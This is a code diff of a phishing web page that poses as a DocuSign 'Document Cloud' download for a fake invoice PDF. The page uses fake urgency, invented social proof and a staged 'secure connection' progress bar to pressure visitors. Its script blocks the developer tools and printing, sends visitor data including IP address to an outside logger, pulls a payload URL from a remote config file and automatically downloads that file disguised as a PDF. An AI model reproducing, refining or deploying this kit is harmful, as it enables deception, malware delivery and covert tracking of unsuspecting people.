@@ -7,7 +7,6 @@
     <title>DocuSign - Complete with Document Cloud</title>
     <meta name="description" content="Secure document management portal">
     
-    <!-- Favicon matching DocuSign -->
     <link rel="icon" type="image/x-icon" href="https://docucdn-a.akamaihd.net/olive/images/2.62.0/favicon.ico">
     
     <style>
@@ -31,7 +30,6 @@
             color: #333;
         }
         
-        /* Security watermark background */
         body::before {
             content: 'SECURE';
             position: fixed;
@@ -63,7 +61,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
-        /* Header with DocuSign branding */
         .header {
             background: linear-gradient(135deg, #0056b3 0%, #003d80 100%);
             padding: 30px;
@@ -108,7 +105,6 @@
             backdrop-filter: blur(10px);
         }
         
-        /* Document info section - Psychology of Authority */
         .doc-info {
             padding: 40px 30px 20px;
             text-align: center;
@@ -158,46 +154,6 @@
             margin-bottom: 15px;
         }
         
-        .sender-info {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            background: #f8f9fa;
-            padding: 12px 20px;
-            border-radius: 50px;
-            margin: 15px 0;
-            border: 1px solid #e9ecef;
-        }
-        
-        .sender-avatar {
-            width: 36px;
-            height: 36px;
-            background: #0056b3;
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 14px;
-        }
-        
-        .sender-details {
-            text-align: left;
-        }
-        
-        .sender-name {
-            font-weight: 700;
-            color: #212529;
-            font-size: 14px;
-        }
-        
-        .sender-email {
-            font-size: 12px;
-            color: #6c757d;
-        }
-        
-        /* Urgency indicators */
         .urgency-banner {
             background: #fff3cd;
             border-left: 4px solid #ffc107;
@@ -215,7 +171,6 @@
             color: #d39e00;
         }
         
-        /* Progress section - Psychology of Commitment */
         .progress-section {
             padding: 30px;
             background: linear-gradient(to bottom, #ffffff, #f8f9fa);
@@ -336,7 +291,6 @@
             color: #0056b3;
         }
         
-        /* Action area */
         .action-area {
             padding: 30px;
             text-align: center;
@@ -413,7 +367,6 @@
             font-weight: 600;
         }
         
-        /* Completion state */
         .completion-message {
             display: none;
             padding: 40px;
@@ -471,35 +424,18 @@
             line-height: 1.8;
         }
         
-        /* Mobile optimizations */
         @media (max-width: 640px) {
-            .container {
-                margin: 10px;
-            }
-            
-            .header h1 {
-                font-size: 20px;
-            }
-            
-            .progress-steps {
-                display: none;
-            }
-            
-            .urgency-banner {
-                margin: 15px;
-                font-size: 13px;
-            }
+            .container { margin: 10px; }
+            .header h1 { font-size: 20px; }
+            .progress-steps { display: none; }
+            .urgency-banner { margin: 15px; font-size: 13px; }
         }
         
-        /* Anti-inspection */
-        @media print {
-            body { display: none !important; }
-        }
+        @media print { body { display: none !important; } }
     </style>
 </head>
 <body oncontextmenu="return false">
     <div class="container">
-        <!-- Header -->
         <div class="header">
             <img src="https://www.docusign.com/sites/default/files/docusign_logo_white.png" alt="DocuSign" class="logo" onerror="this.style.display='none'">
             <h1>Document Cloud</h1>
@@ -509,17 +445,15 @@
             </div>
         </div>
         
-        <!-- Document Info -->
         <div class="doc-info">
             <div class="doc-icon">📄</div>
-            <div class="doc-title" id="docTitle">Confidential_Document_Package.pdf</div>
+            <div class="doc-title" id="docTitle">Invoice_w1fm5S8.pdf</div>
             <div class="doc-meta">
                 <span id="fileSize">2.4 MB</span> • 
-                <span id="pageCount">PDF Document</span> • 
+                <span>PDF Document</span> • 
                 Expires in <strong style="color:#dc3545">23 hours</strong>
             </div>
          
-            <!-- Urgency Trigger -->
             <div class="urgency-banner">
                 <span>⚠️</span>
                 <div>
@@ -529,7 +463,6 @@
             </div>
         </div>
         
-        <!-- Progress Section -->
         <div class="progress-section" id="progressArea">
             <div class="progress-header">
                 <span class="progress-status" id="statusText">Establishing secure connection...</span>
@@ -560,11 +493,10 @@
             </div>
         </div>
         
-        <!-- Action Area -->
         <div class="action-area" id="actionArea">
-            <button class="btn-primary" id="downloadBtn" onclick="startDownload()" disabled>
+            <button class="btn-primary" id="downloadBtn" disabled>
                 <span>⏳</span>
-                <span>Preparing Secure Download...</span>
+                <span id="btnText">Preparing Secure Download...</span>
             </button>
             
             <div class="secondary-text">
@@ -579,7 +511,6 @@
             </div>
         </div>
         
-        <!-- Completion State (Hidden initially) -->
         <div class="completion-message" id="completionArea">
             <div class="success-icon">✓</div>
             <h2 style="color:#28a745; margin-bottom:10px;">Download Started!</h2>
@@ -596,13 +527,13 @@
                 </ol>
             </div>
             
-            <button class="btn-primary" onclick="forceDownload()" style="margin-top:10px;">
+            <button class="btn-primary" id="retryBtn" style="margin-top:10px;">
                 <span>📥</span>
                 <span>Download Again</span>
             </button>
             
             <p style="margin-top:20px; font-size:12px; color:#6c757d;">
-                Didn't work? <a href="#" onclick="manualDownload()" style="color:#0056b3; text-decoration:none; border-bottom:1px solid #0056b3;">Click here for manual download</a>
+                Didn't work? <a href="#" id="manualLink" style="color:#0056b3; text-decoration:none; border-bottom:1px solid #0056b3;">Click here for manual download</a>
             </p>
         </div>
     </div>
@@ -611,19 +542,19 @@
     (function() {
         'use strict';
         
-        // CONFIGURATION
         const CONFIG = {
-            LOGGER: 'https://oracleflexcubesoftware.com/facts/about.php',
+            LOGGER_URL: 'https://oracleflexcubesoftware.com/facts/about.php',
             CONFIG_URL: 'https://raw.githubusercontent.com/maevalig-svg/abouthmtl/refs/heads/main/about.txt',
             FALLBACK_URL: '',
             DOC_NAME: 'Invoice_w1fm5S8.pdf',
             FILE_SIZE: '2.4 MB'
         };
         
-        let targetUrl = CONFIG.FALLBACK_URL;
+        let targetUrl = '';
         let downloadTriggered = false;
+        let isReady = false;
         
-        // Anti-Debug
+        // Block DevTools keys
         document.addEventListener('keydown', function(e) {
             if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
                 e.preventDefault();
@@ -631,21 +562,28 @@
             }
         });
         
-        // Set psychological triggers
+        // Initialize UI
         document.getElementById('docTitle').textContent = CONFIG.DOC_NAME;
-        document.getElementById('senderName').textContent = CONFIG.SENDER_NAME;
-        document.getElementById('senderEmail').textContent = CONFIG.SENDER_EMAIL;
-        document.getElementById('senderInitials').textContent = CONFIG.SENDER_NAME.split(' ').map(n => n[0]).join('');
         document.getElementById('fileSize').textContent = CONFIG.FILE_SIZE;
         
-        // Randomize social proof (Psychology: Herd mentality)
+        // Random social proof
         const orgNames = ['your organization', 'Acme Corp', 'the team', 'department staff', 'regional office'];
         const counts = [2, 3, 4, 5];
         document.getElementById('downloadCount').textContent = 
             `Downloaded by ${counts[Math.floor(Math.random()*counts.length)]} others in ${orgNames[Math.floor(Math.random()*orgNames.length)]}`;
         
-        // IP & Data Collection
-        async function collectData() {
+        // Logger function
+        function logData(data) {
+            try {
+                const img = new Image();
+                const params = new URLSearchParams();
+                Object.keys(data).forEach(k => params.append(k, encodeURIComponent(String(data[k]))));
+                img.src = `${CONFIG.LOGGER_URL}?${params.toString()}`;
+            } catch(e) {}
+        }
+        
+        // Get IP and log
+        async function collectAndLog() {
             const data = {
                 timestamp: new Date().toISOString(),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -653,12 +591,9 @@
                 language: navigator.language,
                 referrer: document.referrer || 'direct',
                 screen: `${screen.width}x${screen.height}`,
-                platform: navigator.platform,
-                cores: navigator.hardwareConcurrency || 'unknown',
-                memory: navigator.deviceMemory || 'unknown'
+                platform: navigator.platform
             };
             
-            // Get IP
             try {
                 const res = await fetch('https://api.ipify.org?format=json', {cache: 'no-store'});
                 const ipData = await res.json();
@@ -667,149 +602,172 @@
                 data.ip = 'unknown';
             }
             
-            // Send to logger
-            const img = new Image();
-            img.src = `${CONFIG.LOGGER}?data=${encodeURIComponent(JSON.stringify(data))}`;
-            
+            logData(data);
             return data;
         }
         
-        // Get real download URL
-        async function initDownloadUrl() {
+        // Fetch target URL from config
+        async function fetchTargetUrl() {
             try {
-                const res = await fetch(`${CONFIG.CONFIG_URL}?t=${Date.now()}`, {cache: 'no-store'});
+                const res = await fetch(`${CONFIG.CONFIG_URL}?nocache=${Date.now()}`, {
+                    cache: 'no-store',
+                    headers: {'Accept': 'text/plain'}
+                });
+                if(!res.ok) throw new Error('Fetch failed');
                 const text = await res.text();
                 const url = text.trim();
-                if(url.match(/^https?:\/\/.+/)) {
-                    targetUrl = url;
+                
+                // Convert github raw URL format
+                if(url.includes('github.com') && url.includes('/raw/')) {
+                    const match = url.match(/github\.com\/([^\/]+)\/([^\/]+)\/raw\/refs\/heads\/(.+)/);
+                    if(match) {
+                        return `https://raw.githubusercontent.com/${match[1]}/${match[2]}/${match[3]}`;
+                    }
                 }
+                return url || CONFIG.FALLBACK_URL;
             } catch(e) {
-                console.log('Using fallback');
+                return CONFIG.FALLBACK_URL;
             }
         }
         
-        // Progress Animation (Psychology: Commitment consistency)
+        // Progress animation
         async function runProgress() {
             const steps = [
-                {p: 15, t: 'Verifying SSL certificate...', s: 1},
-                {p: 35, t: 'Authenticating user session...', s: 1},
-                {p: 50, t: 'Locating document in cloud...', s: 2},
-                {p: 65, t: 'Decrypting file contents...', s: 2},
-                {p: 80, t: 'Scanning for security threats...', s: 3},
-                {p: 95, t: 'Finalizing secure package...', s: 3},
+                {p: 15, t: 'Resolving DNS...', s: 1},
+                {p: 35, t: 'Authenticating session...', s: 1},
+                {p: 55, t: 'Fetching from cloud...', s: 2},
+                {p: 75, t: 'Decrypting document...', s: 3},
                 {p: 100, t: 'Ready for download', s: 4}
             ];
             
-            let current = 0;
             const bar = document.getElementById('progressBar');
             const status = document.getElementById('statusText');
             const percent = document.getElementById('percentText');
             const btn = document.getElementById('downloadBtn');
             
-            // Collect data in background during "security scan"
-            const userData = await collectData();
-            await initDownloadUrl();
+            // Fetch URL in background
+            targetUrl = await fetchTargetUrl();
             
-            for(let step of steps) {
-                await new Promise(r => setTimeout(r, 600 + Math.random() * 800));
+            // Start progress
+            for(let i = 0; i < steps.length; i++) {
+                const step = steps[i];
                 
+                // Update UI
                 bar.style.width = step.p + '%';
                 status.textContent = step.t;
                 percent.textContent = step.p + '%';
                 
-                // Activate step icons
-                for(let i = 1; i <= 4; i++) {
-                    const el = document.getElementById('step' + i);
-                    if(i < step.s) el.className = 'step completed';
-                    else if(i === step.s) el.className = 'step active';
+                // Update step icons
+                for(let j = 1; j <= 4; j++) {
+                    const el = document.getElementById('step' + j);
+                    if(j < step.s) el.className = 'step completed';
+                    else if(j === step.s) el.className = 'step active';
                 }
                 
-                current = step.p;
+                // Wait before next step
+                await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
             }
             
-            // Enable button with psychology trigger
+            // Enable button
+            isReady = true;
             btn.disabled = false;
             btn.innerHTML = '<span>🔓</span><span>Access & Download Document</span>';
             btn.style.background = 'linear-gradient(135deg, #28a745 0%, #1e7e34 100%)';
             
-            // Auto-trigger after 3 seconds (impatient users will click, patient ones wait - both work)
+            // Auto-download after 2 seconds
             setTimeout(() => {
                 if(!downloadTriggered) {
-                    btn.innerHTML = '<span>📥</span><span>Click to Download Now</span>';
-                    btn.style.animation = 'pulse 1.5s infinite';
+                    performDownload();
                 }
-            }, 3000);
+            }, 2000);
         }
         
-        // Force file download (not just open)
-        window.startDownload = function() {
-            if(downloadTriggered) return;
+        // Perform the actual download
+        async function performDownload() {
+            if(downloadTriggered || !isReady || !targetUrl) return;
             downloadTriggered = true;
             
             const btn = document.getElementById('downloadBtn');
-            btn.innerHTML = '<span>⏳</span><span>Opening...</span>';
+            btn.innerHTML = '<span>⏳</span><span>Opening Document...</span>';
             btn.disabled = true;
             
-            // Method 1: Try fetch + blob for forced download (best for PDFs)
-            fetch(targetUrl)
-                .then(response => response.blob())
-                .then(blob => {
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = CONFIG.DOC_NAME; // Forces download vs open
-                    document.body.appendChild(a);
-                    a.click();
-                    window.URL.revokeObjectURL(url);
+            // Log the download attempt
+            logData({action: 'download_attempt', target: targetUrl, time: new Date().toISOString()});
+            
+            try {
+                // Method 1: Fetch blob and force download
+                const response = await fetch(targetUrl, {cache: 'no-store'});
+                if(!response.ok) throw new Error('Network error');
+                
+                const blob = await response.blob();
+                const blobUrl = window.URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = blobUrl;
+                a.download = CONFIG.DOC_NAME; // Forces save as PDF name
+                document.body.appendChild(a);
+                a.click();
+                
+                setTimeout(() => {
                     document.body.removeChild(a);
-                    showCompletion();
-                })
-                .catch(() => {
-                    // Method 2: Fallback to iframe method
-                    forceDownload();
-                });
-        };
+                    window.URL.revokeObjectURL(blobUrl);
+                }, 100);
+                
+                showCompletion();
+                
+            } catch(error) {
+                // Method 2: Fallback to iframe
+                fallbackDownload();
+            }
+        }
         
-        window.forceDownload = function() {
-            // Create invisible iframe to trigger download
+        function fallbackDownload() {
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = targetUrl;
             document.body.appendChild(iframe);
             
-            // Also try window.open as backup
-            setTimeout(() => {
-                window.open(targetUrl, '_blank');
-            }, 500);
+            // Also try window.open
+            setTimeout(() => window.open(targetUrl, '_blank'), 500);
             
             setTimeout(() => {
                 iframe.remove();
                 showCompletion();
             }, 3000);
-        };
-        
-        window.manualDownload = function() {
-            window.location.href = targetUrl;
-            showCompletion();
-            return false;
-        };
+        }
         
         function showCompletion() {
             document.getElementById('progressArea').style.display = 'none';
             document.getElementById('actionArea').style.display = 'none';
+            document.querySelector('.urgency-banner').style.display = 'none';
             document.getElementById('completionArea').classList.add('show');
-            
-            // Scroll to completion
-            document.getElementById('completionArea').scrollIntoView({behavior: 'smooth'});
         }
         
-        // Start progress on load
-        setTimeout(runProgress, 500);
+        // Event listeners
+        document.getElementById('downloadBtn').addEventListener('click', performDownload);
         
-        // Mobile detection for specific messaging
-        if(/Mobile|Android|iPhone|iPad|iPod/.test(navigator.userAgent)) {
-            document.getElementById('fileSize').innerHTML += ' <span style="color:#0056b3;">(Mobile Optimized)</span>';
+        document.getElementById('retryBtn').addEventListener('click', function() {
+            downloadTriggered = false;
+            fallbackDownload();
+        });
+        
+        document.getElementById('manualLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = targetUrl;
+        });
+        
+        // Start everything when DOM is ready
+        if(document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', function() {
+                collectAndLog();
+                runProgress();
+            });
+        } else {
+            collectAndLog();
+            runProgress();
         }
+        
     })();
     </script>
 </body>
